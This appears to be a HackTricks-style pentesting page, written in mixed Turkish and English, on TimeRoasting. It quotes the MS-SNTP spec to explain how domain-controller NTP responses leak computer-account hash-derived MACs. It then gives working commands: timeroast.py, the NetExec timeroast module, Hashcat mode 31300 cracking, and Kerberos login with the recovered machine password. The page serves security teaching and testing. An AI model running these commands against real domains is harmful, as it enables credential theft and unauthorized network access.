# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting, eski MS-SNTP authentication extension'ını abuse eder. MS-SNTP'de bir client, herhangi bir computer account RID'ini içeren 68-byte'lık bir request gönderebilir; domain controller, response üzerinde bir MAC hesaplamak için computer account'ın NTLM hash'ini (MD4) key olarak kullanır ve bunu geri döndürür.<sup>[[1]](#references)</sup> Attackers bu MS-SNTP MAC'lerini authentication olmadan toplayabilir ve computer account password'larını elde etmek için offline olarak crack edebilir (Hashcat mode 31300).<sup>[[2]](#references)</sup>

Ayrıntılar için resmi MS-SNTP spec'inin 3.1.5.1 "Authentication Request Behavior" ve 4 "Protocol Examples" bölümlerine bakın.<sup>[[1]](#references)</sup>
![TimeRoasting: Ayrıntılar için resmi MS-SNTP spec'inin 3.1.5.1 "Authentication Request Behavior" ve 4 "Protocol Examples" bölümlerine bakın](../../images/Pasted%20image%2020250709114508.png)
ExtendedAuthenticatorSupported ADM element'i false olduğunda client, 68-byte'lık bir request gönderir ve RID'i authenticator'ın Key Identifier subfield'ının en düşük anlamlı 31 bitine yerleştirir.<sup>[[1]](#references)</sup>

> ExtendedAuthenticatorSupported ADM element'i false ise client bir Client NTP Request message oluşturmalıdır (MUST). Client NTP Request message uzunluğu 68 byte'tır. Client, Client NTP Request message'ının Authenticator field'ını section 2.2.1'de açıklandığı şekilde ayarlar; RID value'sunun en düşük anlamlı 31 bitini authenticator'ın Key Identifier subfield'ının en düşük anlamlı 31 bitine yazar ve ardından Key Selector value'sunu Key Identifier subfield'ının en yüksek anlamlı bitine yazar.<sup>[[1]](#references)</sup>

Section 4 (Protocol Examples)'ten:

> Request'i aldıktan sonra server, alınan message size'ın 68 byte olduğunu doğrular. Alınan message size'ın 68 byte olduğu varsayıldığında server, RID'i alınan message'dan çıkarır. Server, crypto-checksum'ları hesaplamak ve alınan message'daki Key Identifier subfield'ının en yüksek anlamlı bitine göre crypto-checksum'ı seçmek için bunu NetrLogonComputeServerDigest method'unu ([MS-NRPC] section 3.5.4.8.2'de belirtildiği şekilde) çağırmak üzere kullanır; bu işlem section 3.2.5'te açıklanmıştır. Server daha sonra client'a bir response gönderir ve Key Identifier field'ını 0, Crypto-Checksum field'ını ise hesaplanan crypto-checksum olarak ayarlar.<sup>[[1]](#references)</sup>

Crypto-checksum MD5 tabanlıdır (bkz. 3.2.5.1.1) ve offline olarak crack edilebilir; bu da roasting attack'ini mümkün kılar.<sup>[[1]](#references)</sup>

## Nasıl Attack Yapılır

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort tarafından hazırlanmış Timeroasting script'leri<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## NetExec + Hashcat ile pratik saldırı (kimlik doğrulamasız)

- NetExec, bilgisayar RID'leri için MS-SNTP MAC'lerini kimlik doğrulaması olmadan enumerate edip toplayabilir ve cracking için hazır `$sntp-ms$` hash'lerini yazdırabilir:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Hashcat mode 31300 (MS-SNTP MAC) ile offline crack:<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Elde edilen cleartext, bir computer account parolasına karşılık gelir. NTLM devre dışı olduğunda bunu Kerberos (-k) kullanarak doğrudan machine account olarak deneyin:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Operasyonel ipuçları
- Kerberos öncesinde doğru zaman senkronizasyonunu sağlayın: `sudo ntpdate <dc_fqdn>`
- Gerekirse AD realm'i için krb5.conf oluşturun: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Kimliği doğrulanmış herhangi bir foothold elde ettikten sonra RID'leri LDAP/BloodHound aracılığıyla principal'larla eşleyin.

## Referanslar

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – official docs](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
